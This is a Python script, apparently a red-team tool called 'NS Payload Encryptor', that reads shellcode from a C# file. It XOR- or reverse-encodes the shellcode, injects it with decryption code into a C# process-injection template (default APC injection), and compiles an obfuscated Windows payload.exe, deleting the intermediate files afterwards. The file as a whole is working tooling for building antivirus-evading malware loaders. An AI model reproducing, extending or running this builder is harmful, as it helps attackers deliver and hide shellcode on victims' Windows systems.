#!/bin/env python3


import subprocess
import argparse
import random
import string
import sys
import os
import time

# Based on https://github.com/smokeme/payloadGenerator
# and https://github.com/pwndizzle/c-sharp-memory-injection
base_dir = os.getcwd()

def generateEncodedShell(encoder, key, file, sdir):

	# Read payload from file
	if os.path.exists(file):
		shellcode = open(file, "r")
		shelcode_data = shellcode.read()
		# Open the original C# Code for the encoder
		full_template_path = "{0}/{1}/template".format(base_dir, sdir)
		original = open(full_template_path, "r")
		data = original.read()

		# Grab the encryption code to place in template
		encryption_template = "{0}/{1}/encrypt.txt".format(base_dir, encoder)
		encryptfile = open(encryption_template,"r")
		encryptcode = encryptfile.read()

		# Replace specific bits with newly generated shellcode and key
		data = data.replace("SHELLCODEHERE", shelcode_data)
		data = data.replace("ENCRYPTHERE", encryptcode)

		# if a key is supplied
		if key != "false":
			data = data.replace("KEYHERE", key)

		# Open a new file and write the replaced text here
		temp_tempate_path = "{0}/{1}/Program.cs".format(base_dir, sdir)
		template = open(temp_tempate_path, "w+")
		template.write(data)

		# Close files
		original.close()
		template.close()
		shellcode.close()
		encryptfile.close()
	else:
		print("[-] Shellcode path is not exists, please check it!")

def generatePayload(encoder, template_directory, key, sdir):
	# Build the encrypted version of the shellcode and save it to output.shellcode
	build_command = "cd {0}/{1}/ && dotnet run > output.shellcode".format(base_dir, sdir)
	os.system(build_command)

	# Open the shellcode
	shellcode_path = "{0}/{1}/output.shellcode".format(base_dir, sdir)
	shellcode = open(shellcode_path,"r")
	shelcode_data = shellcode.read()

	# Open the original C# code for the payload
	original_code_path = "{0}/{1}/template".format(base_dir, template_directory)
	original = open(original_code_path, "r")
	data = original.read()

	# Grab the decryption code to place in template
	decryption_code_path = "{0}/{1}/decrypt.txt".format(base_dir, encoder)
	decrypt_file = open(decryption_code_path,"r")
	decrypt_code = decrypt_file.read()

	# Replace specific bits with newly generated shellcode and key
	data = data.replace("SHELLCODEHERE", shelcode_data)
	data = data.replace("DECRYPTHERE", decrypt_code)

	# if a key is supplied
	if key != "false":
		data = data.replace("KEYHERE", key)
	original.close()
	tmp_tempate_path = "{0}/{1}/Program.cs".format(base_dir, template_directory)
	template = open(tmp_tempate_path, "w+")
	template.write(data)
	shellcode.close()
	decrypt_file.close()

def cleanUp(encoder,template_directory,outfile,sdir):
	#TO DO improve cleaning up of files
	compile_command = "cd {0}/{1} && dotnet publish -c Release -r win10-x64".format(base_dir, template_directory)
	os.system(compile_command)

	copy_command = r"copy {}\{}\bin\Release\net45\win10-x64\payload.exe {}\{} /Y".format(base_dir, template_directory, base_dir, outfile)
	os.system(copy_command)


	time.sleep(0.5)

	if not args.noclean:
		delete_template_command = r"del {}\{}\Program.cs && del {}\{}\Program.cs && rd /s/q {}\{}\bin".format(base_dir,template_directory,base_dir,sdir,base_dir,template_directory)
		os.system(delete_template_command)

		delete_shellcode_command = "del {}\{}\output.shellcode".format(base_dir, sdir)
		os.system(delete_shellcode_command)

		delete_bin_directory = r"rd /s/q {}\{}\bin".format(base_dir, sdir)
		os.system(delete_bin_directory)

		delete_obj_directory_command = r"rd /s/q {}\{}\obj".format(base_dir,sdir)
		os.system(delete_obj_directory_command)

		delete_template_directory_command = r"rd /s/q {}\{}\obj".format(base_dir, template_directory)
		os.system(delete_template_directory_command)
	else:
		print("Files not cleaned as -noclean flag present")


parser = argparse.ArgumentParser(description="Generate obfuscated payloads.")

requiredNamed = parser.add_argument_group("required named arguments")

requiredNamed.add_argument(
	"-file",
	dest="file",
	help="C# file with byte[] buf *NOTE* if you see errors, please check the variable is called buf and not my_buf (from Donut) for example.",
	required=True
)


requiredNamed.add_argument(
	"-key",
	 dest="key",
	 help="Key for payload (example: 0xff) *NOTE* no validation is done on key value",
	 required=False,
	  default="false"
  )

requiredNamed.add_argument(
	"-method",
	dest="method",
	help="Payload encryption method (xor,reverse)",
	required=True
)

requiredNamed.add_argument(
	"-template",
	dest="templatedir",
	help="Template Directory for inserting payload and decryption into",
	required=False,
	default="APC_Inj_New"
 )

requiredNamed.add_argument(
	"-shellcode",
	dest="shelldir",
	help="Template Directory for shellcode creation file",
	required=False,
	default="ShellcodeTemplate"
)

requiredNamed.add_argument(
	"-out",
	dest="out",
	help="Output file",
	required=False,
	default="payload.exe"
)

requiredNamed.add_argument(
	"-noclean",
	dest="noclean",
	help="Prevent cleaning up of files for debugging purposes",
	required=False,
)

args = parser.parse_args()

#TO DO - check encrypt/decrypt file in method folder for presence of KEYHERE. If present and args.key = false then break and alert.
if not args.key:
	parser.print_help(sys.stderr)
	exit()

banner = r'''

███╗   ██╗███████╗ ██████╗ ███████╗███╗   ██╗ ██████╗███████╗
████╗  ██║██╔════╝██╔════╝ ██╔════╝████╗  ██║██╔════╝██╔════╝
██╔██╗ ██║███████╗██║  ███╗█████╗  ██╔██╗ ██║██║     ███████╗
██║╚██╗██║╚════██║██║   ██║██╔══╝  ██║╚██╗██║██║     ╚════██║
██║ ╚████║███████║╚██████╔╝███████╗██║ ╚████║╚██████╗███████║
╚═╝  ╚═══╝╚══════╝ ╚═════╝ ╚══════╝╚═╝  ╚═══╝ ╚═════╝╚══════╝

NS Payload Encryptor by @bb_hacks

'''

print(banner)
print("> Creating encoded shellcode from CS file")
generateEncodedShell(args.method,args.key,args.file, args.shelldir)
print("> Generating payload")
generatePayload(args.method,args.templatedir,args.key, args.shelldir)
print("> Cleanup")
cleanUp(args.method, args.templatedir, args.out, args.shelldir)
print("\nIf you didn't see a bunch of red lines before this message, you should see " + args.out + " now :)")
exit()
